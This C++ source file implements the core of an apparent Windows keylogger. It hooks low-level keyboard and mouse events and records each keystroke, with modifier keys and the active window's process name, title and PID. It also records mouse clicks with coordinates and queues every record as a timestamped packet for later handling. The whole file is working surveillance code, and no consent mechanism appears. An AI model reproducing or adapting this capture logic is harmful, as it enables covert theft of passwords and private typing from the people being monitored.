#include "Packager.h"


Packager::Packager()
  : _sem(0)
{
	_shift = false;
	_win = false;
	_ctrl = false;
	_alt = false;
	_altGr = false;

	correspondance[112] = "[F1]";
	correspondance[113] = "[F2]";
	correspondance[114] = "[F3]";
	correspondance[115] = "[F4]";
	correspondance[116] = "[F5]";
	correspondance[117] = "[F6]";
	correspondance[118] = "[F7]";
	correspondance[119] = "[F8]";
	correspondance[120] = "[F9]";
	correspondance[121] = "[F10]";
	correspondance[122] = "[F11]";
	correspondance[123] = "[F12]";
	correspondance[45] = "[INSER]";
	correspondance[36] = "[HOME]";
	correspondance[33] = "[PAGE UP]";
	correspondance[34] = "[PAGE DOWN]";
	correspondance[46] = "[DEL]";
	correspondance[35] = "[END]";
	correspondance[8] = "[BACKSPACE]";
	correspondance[13] = "[ENTER]";
	correspondance[27] = "[ESCAPE]";
	correspondance[38] = "[UP]";
	correspondance[40] = "[DOWN]";
	correspondance[37] = "[LEFT]";
	correspondance[39] = "[RIGHT]";
	correspondance[93] = "[MENU]";

}


Packager::~Packager()
{
}


void Packager::addPaquet(Paquet * paquet)
{
	_paquets.push_back(paquet);
}

void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *info = (KBDLLHOOKSTRUCT *)lParam;
	_shift = ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 256) ? true : _shift;
	_shift = ((info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) && wParam == 257) ? false : _shift;

	_ctrl = ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 256) ? true : _ctrl;
	_ctrl = ((info->vkCode == VK_LCONTROL || info->vkCode == VK_RCONTROL) && wParam == 257) ? false : _ctrl;

	_win = ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 256) ? true : _win;
	_win = ((info->vkCode == VK_LWIN || info->vkCode == VK_RWIN) && wParam == 257) ? false : _win;

	_alt = (info->vkCode == 164 && wParam == 260) ? true : _alt;
	_alt = (info->vkCode == 164 && wParam == 257) ? false : _alt;

	_altGr = (info->vkCode == 165 && wParam == 260) ? true : _altGr;
	_altGr = (info->vkCode == 165 && wParam == 257) ? false : _altGr;


	if (wParam != 257) {
		BYTE kbdState[256];
		GetKeyboardState(kbdState);
		WCHAR buff[2];
		PaquetKeys *tmp = new PaquetKeys();

		std::string fullActiveName;
		fullActiveName = *SelfUtils::getNameFromPID(SelfUtils::getActiveWindowPID()) + " - "
			+ *SelfUtils::getActiveWindowTitle();
		tmp->setActive(fullActiveName);

		tmp->setDate(SelfUtils::secondsSinceEpoch());
		tmp->setPid(SelfUtils::getActiveWindowPID());

		std::string	str;
		str += (_shift ? "[MAJ] " : "");
		str += (_ctrl ? "[CTRL] " : "");
		str += (_win ? "[WIN] " : "");
		str += (_alt ? "[ALT] " : "");
		str += (_altGr ? "[ALT GR] " : "");

		if ((info->vkCode != 13 && info->vkCode != 8 && info->vkCode != 27) && (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0)) {
			std::wstring ws(buff);
			str.append(ws.begin(), ws.end());
		}
		else {
			str += correspondance[info->vkCode];
		}
		tmp->setText(str);
		tmp->createPaquet();
		_sem.post();
		_paquets.push_back(tmp);
	}
}

void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
	MSLLHOOKSTRUCT* info = (MSLLHOOKSTRUCT*)lParam;
	PaquetMouse *tmp = new PaquetMouse();

	std::string fullActiveName;
	fullActiveName = *SelfUtils::getNameFromPID(SelfUtils::getActiveWindowPID()) + "-"
		+ *SelfUtils::getActiveWindowTitle();
	tmp->setActive(fullActiveName);

	tmp->setDate(SelfUtils::secondsSinceEpoch());
	tmp->setPid(SelfUtils::getActiveWindowPID());

	tmp->setX(info->pt.x);
	tmp->setY(info->pt.y);

	WORD highOrder = info->mouseData >> 16;
	tmp->setButton(wParam == WM_LBUTTONDOWN ? 1 :
		(wParam == WM_RBUTTONDOWN ? 4 :
			(wParam == WM_MBUTTONDOWN ? 2 :
				(highOrder == XBUTTON1 ? 8 :
					(highOrder == XBUTTON2 ? 16 : 0)))));

	tmp->createPaquet();
	_sem.post();
	_paquets.push_back(tmp);
}

size_t Packager::isLeft() {
	_sem.wait();
	return _paquets.size();
}

Paquet *Packager::getPaquet() {
	return _paquets.front();
}

void Packager::supprPaquet() {
	_paquets.erase(_paquets.begin());
}
